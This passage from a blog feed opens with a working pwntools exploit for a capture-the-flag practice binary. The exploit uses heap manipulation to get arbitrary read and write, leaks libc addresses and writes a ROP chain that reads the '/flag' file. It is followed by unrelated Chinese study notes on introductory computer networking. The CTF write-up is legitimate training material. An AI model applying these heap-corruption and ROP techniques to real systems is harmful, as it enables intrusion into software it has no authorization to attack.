class="hljs-string">b&#x27;\n&#x27;</span>)*<span class="hljs-number">2000</span>)<br>        os.wait()<br>        time.sleep(<span class="hljs-number">0.1</span>)<br>        r1.sendline(<span class="hljs-string">b&#x27;malloc 0 printf 0&#x27;</span>)<br>        output = <span class="hljs-string">b&#x27;&#x27;</span><br>        r1.recvuntil(<span class="hljs-string">b&#x27;MESSAGE: &#x27;</span>)<br>        output = r1.recvline()[:-<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">if</span> output == packed.split(<span class="hljs-string">b&#x27;\0&#x27;</span>)[<span class="hljs-number">0</span>]:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">b&#x27;OUTPUT: &#x27;</span> + output + <span class="hljs-string">b&#x27; PACKED: &#x27;</span>, packed.split(<span class="hljs-string">b&#x27;\0&#x27;</span>))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-comment">#malloc the controlled chunk</span><br>    r1.sendline(<span class="hljs-string">f&#x27;malloc <span class="hljs-subst">&#123;idx&#125;</span>&#x27;</span>.encode())<br>    idx += <span class="hljs-number">1</span><br>    <br><span class="hljs-comment">#support 8 bytes read</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">arbitrary_read</span>(<span class="hljs-params">r1, r2, addr, unalign=<span class="hljs-literal">False</span></span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    <span class="hljs-keyword">if</span> unalign:<br>        r1.sendline(<span class="hljs-string">b&#x27;malloc 10&#x27;</span>)<br>        arbitrary_write(r1, r2, binary_base+<span class="hljs-number">0x4040</span>+<span class="hljs-number">0x8</span>*<span class="hljs-number">10</span>, addr)<br>        r1.sendline(<span class="hljs-string">b&#x27;printf 10&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        controlled_allocation(r1, r2, addr)<br>        r1.sendline(<span class="hljs-string">f&#x27;printf <span class="hljs-subst">&#123;idx-<span class="hljs-number">1</span>&#125;</span>&#x27;</span>.encode())<br>    r1.recvuntil(<span class="hljs-string">b&#x27;MESSAGE: &#x27;</span>)<br>    output = r1.clean()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;MESSAGE IS: &#x27;</span>, output)<br>    pwn.context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>    <span class="hljs-keyword">return</span> output<br>    <br><span class="hljs-comment">#support digital write</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">arbitrary_write</span>(<span class="hljs-params">r1, r2, addr, value, unalign=<span class="hljs-literal">False</span></span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    <span class="hljs-keyword">if</span> unalign:<br>        r1.sendline(<span class="hljs-string">b&#x27;malloc 10&#x27;</span>)<br>        arbitrary_write(r1, r2, binary_base+<span class="hljs-number">0x4040</span>+<span class="hljs-number">0x8</span>*<span class="hljs-number">10</span>, addr)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(value[<span class="hljs-number">0</span>]) == <span class="hljs-built_in">bytes</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;SCANF(bytes): &#x27;</span>, value[<span class="hljs-number">0</span>])<br>            r1.sendline(<span class="hljs-string">b&#x27;scanf 10 &#x27;</span> + value[<span class="hljs-number">0</span>])<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;PROCESS POLL: &#x27;</span>, p.poll())<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;SCANF(int): &#x27;</span>, value[<span class="hljs-number">0</span>])<br>            r1.sendline(<span class="hljs-string">b&#x27;scanf 10 &#x27;</span> + value[<span class="hljs-number">0</span>].to_bytes(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;little&#x27;</span>))<br>        <span class="hljs-keyword">return</span><br>    controlled_allocation(r1, r2, addr)<br>    r1.sendline(<span class="hljs-string">b&#x27;scanf %d &#x27;</span>%(idx-<span class="hljs-number">1</span>) + pwn.flat(value))<br><br><span class="hljs-keyword">try</span>:<br>    p.kill(),r1.close(),r2.close()<br><span class="hljs-keyword">except</span> Exception:<br>    <span class="hljs-keyword">pass</span><br>pwn.context.log_level=<span class="hljs-string">&#x27;info&#x27;</span><br>pwn.context.binary = <span class="hljs-string">&#x27;./toddlertwo_level2.0.elf64&#x27;</span><br>p=pwn.process(<span class="hljs-string">&quot;./toddlertwo_level8.0.elf64&quot;</span>)<br>p.clean()<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;/proc/<span class="hljs-subst">&#123;p.pid&#125;</span>/maps&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-built_in">print</span>(f.read())<br>r1 =pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br>r2 =pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br><br>perthread_leak = leak_perthread_addr(r1,r2);<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;LEAKED: PERTHREAD: &quot;</span>, <span class="hljs-built_in">hex</span>(perthread_leak))<br>main_arena_ptr_address = perthread_leak - <span class="hljs-number">0x8d0</span> + <span class="hljs-number">0x890</span><br>time.sleep(<span class="hljs-number">0.2</span>)<br>main_arena_addr = pwn.u64(arbitrary_read(r1, r2, main_arena_ptr_address)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;MAIN ARENA ADDR: &quot;</span>, <span class="hljs-built_in">hex</span>(main_arena_addr))<br>libc_base = main_arena_addr - <span class="hljs-number">0x1bdba0</span><br><span class="hljs-keyword">if</span> libc_base &gt;  <span class="hljs-number">0</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;LIBC BASE: &#x27;</span>, <span class="hljs-built_in">hex</span>(libc_base))<br>    stored_rip_addr = main_arena_addr - <span class="hljs-number">0x1c1d78</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;STORED RIP ADDR: &#x27;</span>, <span class="hljs-built_in">hex</span>(stored_rip_addr))<br>    <span class="hljs-comment">#stored_rip = pwn.u64(arbitrary_read(r1, r2, stored_rip_addr, True)[:-1].ljust(8, b&#x27;\0&#x27;))</span><br>    <span class="hljs-comment">#print(&#x27;STORED RIP: &#x27;, stored_rip)</span><br>    binary_base = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;/proc/<span class="hljs-subst">&#123;p.pid&#125;</span>/maps&quot;</span>) <span class="hljs-keyword">as</span> f: <br>        binary_base = <span class="hljs-built_in">int</span>(f.read(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;BINARY BASE: &#x27;</span>, <span class="hljs-built_in">hex</span>(binary_base))<br><br>    libc = p.libc<br>    libc.address = libc_base<br>    rop = pwn.ROP(libc, badchars=<span class="hljs-string">b&quot;\x09\x0a\x0b\x0c\x0d\x20&quot;</span>)<br>    rop.call(<span class="hljs-string">&quot;close&quot;</span>, [<span class="hljs-number">3</span>]) <span class="hljs-comment"># used for correctly execute sendfile.</span><br>    rop.call(<span class="hljs-string">&quot;read&quot;</span>, [<span class="hljs-number">0</span>, libc.bss(<span class="hljs-number">0x123</span>), <span class="hljs-number">42</span>])<br>    rop.call(<span class="hljs-string">&quot;open&quot;</span>, [libc.bss(<span class="hljs-number">0x123</span>), <span class="hljs-number">0</span>])<br>    rop.call(<span class="hljs-string">&quot;sendfile&quot;</span>, [<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1024</span>])<br>    rop.call(<span class="hljs-string">&quot;exit&quot;</span>, [<span class="hljs-number">42</span>])<br><br>    thread3_scanf_return_saveaddress = stored_rip_addr - <span class="hljs-number">0x801460</span><br>    <span class="hljs-comment">#pwn.gdb.attach(p, &#x27;init-pwndbg\nb __isoc99_fscanf\nc\nsp\nthr 3\n&#x27;)</span><br>    <span class="hljs-comment">#input(&quot;press enter to continue&quot;)</span><br>    arbitrary_write(r1, r2, thread3_scanf_return_saveaddress , [rop.chain()], <span class="hljs-literal">True</span>)<br>    <span class="hljs-comment">#pwn.gdb.attach(p, &#x27;init-pwndbg\nb *__isoc99_fscanf+176\nc\nsp\nthr 3\n&#x27;)</span><br>    <span class="hljs-comment">#input(&#x27;press enter to continue&#x27;)</span><br>    r2.sendline(pwn.p64(libc_base+<span class="hljs-number">0x27C2D</span>))<br>    p.send(<span class="hljs-string">b&quot;/flag\0&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;LEAKED:&quot;</span>, p.clean())<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;FAILED!!!!!&quot;</span>)<br></code></pre></div></td></tr></table></figure><h4 id="level9-6"><a href="#level9-6" class="headerlink" title="level9"></a>level9</h4><img src="../../image/pwn-modules/13160I313S.jpg" alt="23333" style="zoom:50%;" /><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span>这里要指向2处的地址, 也就是bss+0x10<a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span>这里开始就是从改变后的rsp弹出返回地址. 开始准备通过puts来leak处libc地址.<a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:3" class="footnote-text"><span>这之后要接收puts的地址.<a href="#fnref:3" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PWN</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Computer Networking</title>
    <link href="/2022-01/Archive-Computer-Networking/"/>
    <url>/2022-01/Archive-Computer-Networking/</url>
    
    <content type="html"><![CDATA[<p>这里是在寒假期间开始的计网课本笔记, 为了下学期等到老师讲故事的时候能自然的听下去……</p><h2 id="第一章-概论"><a href="#第一章-概论" class="headerlink" title="第一章: 概论"></a>第一章: 概论</h2><blockquote><p>直接复制(来自<a href="https://blog.csdn.net/wwj17647590781/article/details/116896442">这里</a>), 省时间看第八版, 有新的继续补充, 简单的概念罗列不想花时间了, </p></blockquote><h3 id="什么是因特网-两个角度"><a href="#什么是因特网-两个角度" class="headerlink" title="什么是因特网(两个角度)?"></a>什么是因特网(两个角度)?</h3><ul><li><p><strong>（组成角度）</strong> 一种是描述组成它的<strong>软硬件</strong>；</p><ul><li><p><strong>主机/终端：</strong> 所有连入因特网的设备都是主机/终端.</p><ul><li><strong>如何连接？</strong>：端系统通过通信链路和分组交换机连接到一起</li><li><strong>如何接入因特网？:</strong> 端系统通过因特网服务提供商（Internet Service Providers (ISPs)）接入因特网。</li></ul></li><li><p><strong>分组交换机：</strong></p><ul><li><p>最有的分组交换机：<strong>路由器</strong> 、链路交换机 </p></li><li><p>作用：从它的一条入链路接收分组，然后从它的一条出链路转发分组。</p><p>一个分组所经历的一系列通信链路和分组交换机称为通过该网络的<strong>路径route/path</strong>。</p></li><li><p>区别：路由器主要用在<strong>网络核心</strong>，链路层交换机主要用在<strong>接入网</strong>中</p></li></ul></li><li><p><strong>分组：</strong></p><ul><li><strong>组成：</strong> <strong>分组=用户数据段+相应的必要信息</strong>。</li><li><strong>作用：</strong> 端系统之间发送数据时，我们把数据分成一段一段，然后加上必要的信息形成一个一个数据包，这个数据包用术语说叫做分组）（相应的接收端会根据这一个一个数据包，也就是这一个一个分组中的必要信息来获得用户数据段）。</li></ul></li></ul></li><li><p><strong>（功能角度）</strong> 另一种是将其视为为an infrastructure for providing services to distributed applications.</p><ul><li>End systems attached to the Internet provide a <strong>socket interface套接字接口</strong> that specifies how a program running on one end system asks the Internet infrastructure to deliver data to a specific destination program running on another end system.</li><li>就是一堆rules</li></ul></li><li><p><strong>协议：</strong></p><ul><li><strong>定义：</strong> 两个或多个通信实体（不一定是端系统，还有可能是分组交换机等）之间交换信息的格式和次序以及对该信息所采取的动作（通俗来说：描述通信双方交互信息的方式，控制报文发送接受，相当于<strong>合同的约束</strong>）。</li><li><strong>例子：</strong><ul><li>硬件实现的控制协议控制了两块网卡之间的比特流；</li><li>在端系统中，拥塞控制协议控制了发送方和接收方之间传输数据的速率等</li></ul></li></ul></li></ul><h3 id="网络的边缘"><a href="#网络的边缘" class="headerlink" title="网络的边缘"></a>网络的边缘</h3><ul><li><p><strong>端系统：</strong> 与因特网相连的计算机和其它设备，往往处于网络的边缘</p></li><li><p>端系统分类：<strong>客户、服务器</strong> </p><ul><li>客户：通常就是台式电脑，笔记本电脑，手机等</li><li>服务器：一般是用于存储和发布Web页面、中继电子邮件等，属于<strong>大型数据中心</strong>。</li></ul></li><li><p><strong>接入网</strong>：access networks</p><ul><li><p><strong>概念：</strong> 是指将端系统连入到<strong>边缘路由器</strong>的<strong>物理链路</strong> </p></li><li><p><strong>边缘路由器：</strong> 是指端系统到任何其他远程端系统路径上的<strong>第一台路由器.</strong> </p></li><li><p><strong>本地中心局</strong> local central office (CO).</p></li><li><p>家庭接入：<strong>DSL、电缆</strong>、FTTH、==5G Fixed Wireless== </p></li><li><p><strong>digital subscriber line – DSL(数字用户线):</strong> 它的ISP是<strong>本地电话公司</strong>。其使用的通信链路的物理材质为电话线，是一种双绞线。</p><ul><li>用户使用<strong>DSL调制解调器</strong>通过电话线与ISP中的数字用户线接入复用器（<strong>digital subscriber line access multiplexer (DSLAM)<strong>）来交换数据；</strong>家庭DSL调制解调器</strong>将数字数据转换为高频音后通过电话线传输到ISP中心，并且通过<strong>DSL解调器</strong>将DSLAM发送过来的模拟信号转为数字信号<img src="../../image/Computer_Networking/image-20220116215009788.png" alt="image-20220116215009788" style="zoom:50%;" /></li><li><strong>CIC(Cable Internet Access)电缆因特网接入:</strong> 它的ISP是<strong>有线电视公司</strong>。其使用的通信链路的物理材质有<strong>光纤和同轴电缆</strong>，也被称为混合光纤同轴=&gt;<u>hybrid fiber coax (HFC)</u>.<ul><li>用户使用电缆调制解调器通过<strong>同轴电缆与光纤结点</strong>相连，光纤结点通过<strong>光缆与电缆头端相连</strong>，而电缆头端接入了因特网。在<strong>电缆头端</strong>，电缆调制解调器端接系统（<strong>CMTS</strong>, Cable Modem Termination System）起到<strong>DSLAM的作用</strong>，即实现模拟信号和数字信号的转换；<img src="../../image/Computer_Networking/image-20220116215023365.png" alt="image-20220116215023365" style="zoom: 50%;" /></li></ul></li><li><strong>FTTH(Fiber To The Home)光纤到户:</strong> 这里主要是指使用<strong>光纤</strong>作为通信链路的材质。<ul><li>最简单的光纤分布网络称为<strong>直接光纤</strong>，<strong>从本地中心局到每户设置一根光纤</strong>，不过更为一般的是从中心距出来的每根光纤实际上由许多家庭共享，直到相对接近这些家庭的位置，该光纤才被分成每户一根光纤。 <img src="../../image/Computer_Networking/image-20220116215036114.png" style="zoom:50%;" /></li><li>有两种: active optical networks (AONs) and passive optical networks (PONs) </li><li><strong>optical network terminator (ONT)</strong>, which is connected by dedicated optical fiber to a neighborhood splitter</li><li><strong>optical line terminator (OLT)</strong> providing conversion between optical and electrical signals, connects to the Internet via a telco router</li><li>5G fixed wireless开始被部署, 用到了beam-forming(波束成形) technology, 简单来讲就是将信号波集中在一个方向以节约能量以及提高多用户使用速率. </li></ul></li></ul></li><li><p><strong>企业（和家庭）接入：</strong> <strong>以太网和WIFI</strong></p><ul><li><strong>以太网（是局域网（LAN）中最流行的接入技术）：</strong> 接入是一种在公司、大学、家庭里很流行的接入方式；用户使用双绞线与以太网交换机相连，从而接入因特网；接入以太网交换机的速度可达100Mbps;</li><li>在无线局域网中，无线用户从一个接入点发送和接收数据，而该接入点与企业网相连，企业网最终接入因特网；在无线LAN中，用户需要在一个接入点的几十米范围之内；<img src="../../image/Computer_Networking/image-20220116215053931.png" alt="image-20220116215053931" style="zoom:50%;" /></li><li><strong>广域无线接入：</strong> 在移动设备中，通过蜂窝网提供商运营的基站来发送和接收分组，与WIFI不同的是，用户仅需要位于基站的数万米范围之内即可；</li></ul></li><li><p><strong>Wide-Area Wireless Access: 3G and LTE 4G and 5G</strong> </p><ul><li>nothing special, wait until Chapter 7.</li></ul></li></ul></li><li><p><strong>硬件设备：</strong></p><ul><li><strong>传输媒体</strong>是构成通信链路的主要部分，物理媒体通常可以分为<strong>导引性媒体</strong>和<strong>非导引性媒体</strong><ul><li><strong>导引性媒体：</strong> 信号沿着固体前行</li><li><strong>非导引性媒体中：</strong> 信号沿着固体媒体前行</li></ul></li><li><strong>双绞线twisted-pair：</strong> 最便宜的<strong>引导性</strong>传输媒体，由两条相互螺旋缠绕的铜线组成。是局域网的最佳选择.</li><li><strong>同轴电缆Coaxial cable:</strong> 借助特殊的结构和绝缘层，同轴电缆可得到较高的数据传输速率；在电视系统中应用广泛；同轴电缆可被用作 <strong>引导性</strong>的共享媒体；</li><li><strong>多模光纤缆multimode fiber-optic cable:</strong> 一种可以引导光脉冲的媒体</li><li><strong>陆地无线电频谱terrestrial radio spectrum:</strong> 无线电信道承载电磁频谱中的信号，<strong>不需要物理线路</strong>，提供与移动用户的连接以及长距离承载信号的方式；是一种有吸引力的媒体；</li><li><strong>卫星无线电频谱satellite radio spectrum:</strong> 通过卫星连接两个或多个在地球上的微波发射方（也被称为地面站），该卫星在一个频段上接收信号，在另一个频段上发送信号；种类有同步卫星和近地轨道卫星；</li></ul></li></ul><h3 id="网络核心"><a href="#网络核心" class="headerlink" title="网络核心"></a>网络核心</h3><ul><li>在考察了因特网边缘之后，开始深入研究网络核心，也就是<strong>互联网端系统的分组交换机和链路构成的网状网格</strong>。Figure 1.10</li><li>通过网络链路和交换机移动数据有两种基本方法：<strong>电路交换和分组交换</strong></li></ul><h4 id="分组交换："><a href="#分组交换：" class="headerlink" title="分组交换："></a>分组交换：</h4><ul><li>分组在通信链路上以<strong>等于该链路的最大传输速率</strong>传输通过通信链路。</li><li><strong>传输时延（应该是传播时延）：</strong> 如果某条链路的最大传输速率为<strong>R比特/秒</strong>，分组长度为<strong>L比特</strong> ，则该链路传输该分组的时间为<strong>L/R秒</strong>。</li><li><strong>存储转发传输：</strong> 存储转发是指交换机在<strong>收到一个完成的分组</strong>，才会向链路输出转发分组，否则就将收到的部分分组缓存起来；因为<strong>缓存等待一个分组的全部数据</strong>而导致的时间开销被称为<strong>存储转发时延</strong><ul><li>因为需要缓存分组，所以此时分组交换机需要一个<strong>缓冲队列</strong>；</li></ul></li><li><strong>排队时延与分组丢失：</strong><ul><li>因为需要缓存分组，所以此时分组交换机需要一个<strong>输出缓存</strong>和，也称为<strong>输出队列</strong>；<strong>缓冲队列的空间有限性</strong>就有可能导致分组交换机无法继续缓存分组（因为链路被占用（该链路正忙于传输其他分组）或者分组还没全部到位）而使到达分组交换机的数据包<strong>被迫丢弃（分组丢失）（丢包）</strong>；这就导致了分组<strong>不但承担了存储转发传输时延，还承担了排队时延</strong>。这些时延是变化的，变化的程度取决于网络的拥塞程度。</li></ul></li><li><strong>转发表与路由选择协议：</strong><ul><li>实际上，分组交换机之所以能够知道往哪去是因为其内部有一个<strong>转发表</strong>，这个表维护了一个IP地址和链路的对应关系，所以处理流程为：<ul><li>通过<strong>分组的必要信息</strong>，获得目的端系统的<strong>IP地址</strong> </li><li>通过<strong>IP地址索引转发表</strong>，从而确定输出链路</li></ul></li></ul></li></ul><h4 id="电路交换："><a href="#电路交换：" class="headerlink" title="电路交换："></a>电路交换：</h4><ul><li><p>在<strong>电路交换网络</strong>中，在端系统通信会话期间，交换机会<strong>预留</strong>端系统间通信路径上的相关资源（缓存，链路传输速率），即<strong>先建立连接，然后通信</strong>；而在<strong>分组交换网络中，这些资源没有被预留</strong>；也就是说，在端系统进行通信时，其所需要的资源是<strong>被保持</strong>的，其他通信是无法使用这一部分资源的；也就说，端系统间真正建立了一条“连接”；而这一连接，用电话的术语被称为“电路”。传统的电话网络就是电路交换网络的例子。</p></li><li><p>电路交换网络中的复用：</p><ul><li><strong>时分复用（Time-Division Multiplexing TDM）：</strong> 是指将时间划分为<strong>固定区间的帧</strong>，每个帧则又被划分为固定数量的<strong>时间空隙</strong>；当网络需要建立一条连接时，网络将在每个帧中为该连接指定一个时隙；在该时隙内，链路用来传输该链接的数据；</li><li><strong>频分复用(Frequency-Division Multiplexing)：</strong> 将频率域划分为频段，然后将<strong>频段</strong>分配给连接；此频段被用来专门传输链接的数据。该频段的宽度成为带宽。</li></ul></li><li><p><strong>分组交换和电路交换的对比：</strong></p><ul><li><strong>分组交换的优点：</strong><ul><li>它提供了比电路交换更好的带宽共享；</li><li>它比电路交换更简单、更有效、实现成本更低；</li></ul></li><li><strong>分组交换的缺点:</strong><ul><li>分组交换<strong>不适合实时服务</strong>，因为端到端的<strong>时延是可变、不可预测的</strong>，这和整个网络的情况相关；</li></ul></li><li><strong>电路交换的优点：</strong><ul><li>提供了端对端传输数据的速率保证；</li></ul></li><li><strong>电路交换的缺点</strong>：<ul><li>电路交换存在静默期，这是指专用电路空闲时，其占用的资源并没有得到充分的利用；</li><li>建立连接的过程比较复杂；</li></ul></li><li><strong>总结：</strong> 总体上来说，<strong>分组交换的性能要好于电路交换的性能</strong>，但是不同类型的分组交换方式有不同的应用场景；比如一些对最低速率有着严格要求的应用，比如实时服务等，为了获得速率保证，牺牲网络的效率也是可以接受的。趋势向着分组交换发展网络的网络</li></ul></li></ul><h4 id="网络的网络："><a href="#网络的网络：" class="headerlink" title="网络的网络："></a>网络的网络：</h4><ul><li><p>该用什么样的结构来刻画因特网呢？<strong>因特网</strong>是网络的网络</p></li><li><p>通过5个模型不断过渡到最终模型，其实过渡的过程就结构不断合理、连接方式不断明确的过程</p></li><li><p>端系统是通过<strong>ISP接入因特网</strong>的，<strong>为了实现端系统的互联，ISP也必须互联</strong>，其实网络模型就是用来<strong>表达ISP和端系统以及ISP之间的结构的抽象。</strong></p></li><li><p><strong>网络结构1：</strong> <strong>存在唯一的全球传输ISP互联所有的接入ISP</strong>，这是指，全球ISP是一个由路由器和通信链路构成的网络，该网络跨越全球，并且其他的接入ISP都至少和一个它的路由器相连（<strong>接入ISP被认为是客户</strong>，<strong>全球传输被认为是提供商</strong>）；</p></li><li><p><strong>网络结构2：</strong> <strong>存在多个全球传输ISP</strong>，它们分别于一部分的接入ISP互联；为了实现端系统的互联，这多个全球ISP也必须互联；网络结构是一个两层结构，其中<strong>全球传输ISP位于顶层</strong>，<strong>接入ISP处于底层</strong>；</p></li><li><p><strong>网络结构3：</strong> <strong>顶层全球传输ISP基本上已经定型</strong>，但是接入ISP现在还很混乱，比如，它们直接同顶层ISP相连；而网络结构3中，<strong>接入ISP也是分层的</strong>：较小区域中的ISP连入较大区域的ISP，而不是直接与顶层ISP相连；为什么会出现这样的结构呢？这是因为，如果都直接同顶层ISP相连，那么两个同一较小区域内，分属不同ISP的端系统之间通信的数据也会到顶层ISP中心去一趟，如果它们不是直接接入顶层ISP，而是接入了一个较大区域的ISP，那么它们之间的通信数据就不用去顶层ISP中心了，因为它们通过较大区域的ISP已经实现了互连，所以通信速度肯定就上去了。</p></li><li><p><strong>网络结构4</strong>: 是在网络结构3的基础上，增加了以下特点而形成的结构：<strong>存在点</strong>（Point of Presence，<strong>PoP</strong>）、<strong>多宿</strong>、<strong>对等</strong>、<strong>因特网交换点</strong>（Internet exchange point，<strong>IXP</strong>）。</p><ul><li><strong>PoP：</strong> 存在于等级结构中所有层次，但是底层ISP除外；<strong>一个PoP是ISP网络中的一台或者多台路由器群组</strong>，其中客户ISP能够通过第三方<strong>提供的高速链路直接将它的路由器和供应商的PoP连接</strong>，从而实现与提供商ISP连接。这样接入速度很明显就提高了。</li><li><strong>多宿（multi-home）：</strong> 任何ISP（除第一层ISP）都可以与<strong>两个或者多个提供商ISP连接</strong>，这被称为<strong>多宿</strong>；这样网络的<strong>可靠性</strong>就提高了。</li><li><strong>对等（peer）：</strong> 位于<strong>相同等级结构层次的一对邻近ISP能够直接将它们的网络连接到一起</strong>，使它们之间流量经直接连接而不<strong>是经过上游的中间ISP传输</strong>，这样既不用付费，速度也可能会快一些</li><li><strong>IXP：</strong> 因特网交换点是为了实现多个ISP<strong>可以对等</strong>而创建的。</li></ul></li><li><p><strong>网络结构5：</strong> 网络结构5是在网络结构4的基础上<strong>增加了内容提供商网络</strong>而构成。内容提供商构建自己的网络，并且<strong>通过与较低层ISP对等而“绕过”较高层因特网ISP</strong>，而且内容提供商对端用户也有了更多的控制。</p><img src="../../image/Computer_Networking/image-20220116215250646.png" alt="image-20220116215250646" style="zoom:67%;" /></li><li><p>总体来说，今天的因特网是一个“网络的网络”，其结构复杂，由十多个顶层ISP和数十万个较低层ISP构成。近年来，<strong>主要的内容提供商创建自己的网络，直接在可能的地方与较低层ISP互联.</strong></p></li></ul><h3 id="分组交换中的时延、丢包、吞吐量"><a href="#分组交换中的时延、丢包、吞吐量" class="headerlink" title="分组交换中的时延、丢包、吞吐量:"></a>分组交换中的时延、丢包、吞吐量:</h3><ul><li><p>因特网能够看成是一种基础设施，该基础设施为运行在端系统上的分布式应用提供服务。</p></li><li><p><strong>理想目标</strong>：因特网能够在任意两个端系统之间随心所欲地移动数据而没有任何数据丢失，<strong>计算机网络必定要限制在端系统之间的吞吐量（每秒能够传输的数据量），在端系统之间引入时延，而且实际上也会丢失分组</strong></p></li></ul><h4 id="分组交换网中的时延概述："><a href="#分组交换网中的时延概述：" class="headerlink" title="分组交换网中的时延概述："></a>分组交换网中的时延概述：</h4><ul><li>一个分组在沿途每个节点<strong>承受不同类型的时延</strong>，这些时延中最为重要的是：结点<strong>处理时延、排队时延、传输时延</strong>和<strong>传播时延</strong>.这些时延总体累加起来是<strong>结点总时延</strong></li><li><strong>节点总时延==结点处理时延+排队时延+传输时延+传播时延</strong></li><li><strong>时延类型：</strong><ul><li><strong>节点处理时延nodal processing delay：</strong> 是因为节点需要解析分组的必要信息然后决定是哪个出链路（索引转发表等操作）而产生的，通常在微秒或者更低数量级；</li><li><strong>排队时延queuing delay：</strong> 是因为分组所对应的出链路前面有其他分组正在传输，所以分组需要该链路的缓冲队列里等待其他分组传输完毕而产生的，一个特定分组的排队时延长度将取决于先前到达的正在排队等待向链路传输的分组数量。排队时延是到达该队列的流量强度和性质的函数，通常可以达到毫秒级到微秒级；</li><li><strong>传输时延transmission delay(一个分组的节点全部进入链路的时延)：</strong> 传输时延是将<strong>所有分组的比特推向链路所有需要的时间</strong>，实际的传输时延通常在毫秒到微秒数量级。用L表示分组的长度，用Rbps表示从路由器A到B的链路传输速率。传输时延是L/R。</li><li><strong>传播时延propagation delay(链路中消耗的)：</strong> 是指<strong>比特进入链路后，从该链路的起点到下一个结点所用的时间</strong>；一旦分组中的最后一个比特到达路由器就意味着该分组的所有比特都已到达路由器；广域网中，传播时延一般是毫秒级的。<strong>传播时延是d/s</strong>。d是路由器A到B的距离。s是链路的传播速率。</li></ul></li><li>传输时延和传播时延的对比：<ul><li>传输时延：大卡车经过收费站的时间（分组长度L <strong>/</strong> 链路的传输速率）</li><li>传播时延：大卡车在高速上行驶的时间（两台路由器之间的链路长度d <strong>/</strong> 两台路由器之间的传输速率）</li></ul></li></ul><h4 id="排队时延和丢包："><a href="#排队时延和丢包：" class="headerlink" title="排队时延和丢包："></a>排队时延和丢包：</h4><ul><li>丢包Packet Loss：到达的分组发现一个满的队列。由于没有地方存储这个分组，路由器将丢弃该分组，该分组将会丢失。<ul><li>排队时延和丢包与网络的状况和结点的缓冲空间大小、处理速度相关；</li><li>如果分组到达的速度 <strong>&gt;</strong> 结点的处理速度，那么分组就会在缓冲队列里排队等待。</li><li>为了描述网络状态，我们引入了<strong>流量强度traffic intensity</strong>这一概念：<strong>流量强度=分组到达的速度 / 结点的处理速度</strong>；</li><li>流量工程里一个金科玉律就是：设计系统时<strong>流量强度&lt;=1</strong>，流量强度持续大于1时，就将出现<strong>丢包</strong>现象</li></ul></li></ul><h4 id="端到端时延："><a href="#端到端时延：" class="headerlink" title="端到端时延："></a>端到端时延：</h4><ul><li><strong>端到端时延 ==(节点总时延 * (路由器个数+1) )== （结点处理时延+排队时延+传输时延+传播时延）*（路由器个数+1）</strong></li></ul><h4 id="计算机网络的吞吐量："><a href="#计算机网络的吞吐量：" class="headerlink" title="计算机网络的吞吐量："></a>计算机网络的吞吐量：</h4><ul><li>计算机网络的吞吐量实际上是一个速度指标，它描述了<strong>比特经过某个节点的速度</strong> </li><li><strong>某节点的吞吐量 == min(发送数据的速度，接收数据的速度)</strong> </li><li><strong>任何时间的瞬时吞吐量：</strong> 是主机<strong>接受</strong>到该文件的速率</li><li><strong>平均吞吐量：</strong> 该分组的L比特 <strong>/</strong> 主机接收该分组所有的比特用去的时间T</li><li>吞吐量可以近似为源和目的地之间路径的最小传输速率。<strong>最小传输速率的链路为瓶颈链路</strong>。</li><li>在今天，<strong>因特网对吞吐率的限制因素通常是接入网</strong>。</li></ul><h3 id="协议层次及其服务模型："><a href="#协议层次及其服务模型：" class="headerlink" title="协议层次及其服务模型："></a>协议层次及其服务模型：</h3><ul><li>因特网是一个极为复杂的系统，该系统里存在着大量的应用程序和协议、各种类型的端系统、分组交换机和各种类型的链路级媒体。但是它同时也是有着清晰结构的，就像我们前面在网络核心 一节介绍的，我们仍能构建它的结构模型</li></ul><h4 id="分层体系结构"><a href="#分层体系结构" class="headerlink" 